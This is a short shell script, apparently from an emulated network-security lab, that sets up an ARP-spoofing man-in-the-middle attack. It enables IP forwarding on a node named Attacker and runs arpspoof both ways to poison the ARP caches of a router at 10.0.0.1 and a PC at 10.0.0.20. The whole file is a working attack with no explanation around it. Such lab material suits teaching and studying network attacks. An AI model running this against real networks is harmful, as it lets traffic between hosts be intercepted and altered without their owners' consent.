#!/bin/sh

router="10.0.0.1"
PC="10.0.0.20"

os=`uname -s`;
isOSlinux() {
    if test $os = "Linux"; then
        true;
    else
        false;
    fi
}

# enable IP packet forwarding
# and disable sending IP redirects
if isOSlinux; then
    himage Attacker sysctl -w net.ipv4.conf.eth0.forwarding=1
    #himage Attacker sysctl -w net.ipv4.conf.eth0.send_redirects=0
    #himage Attacker sysctl -w net.ipv4.conf.default.send_redirects=0
    #himage Attacker sysctl -w net.ipv4.conf.all.send_redirects=0
else
    himage Attacker sysctl -w net.inet.ip.forwarding=1
    himage Attacker sysctl -w net.inet.ip.redirect=0
fi

# tell the Router that the PC has the Attacker MAC
himage Attacker arpspoof -i eth0 -t $router $PC 2> /dev/null &
# tell the PC that the router has the Attacker MAC
himage Attacker arpspoof -i eth0 -t $PC $router 2> /dev/null &
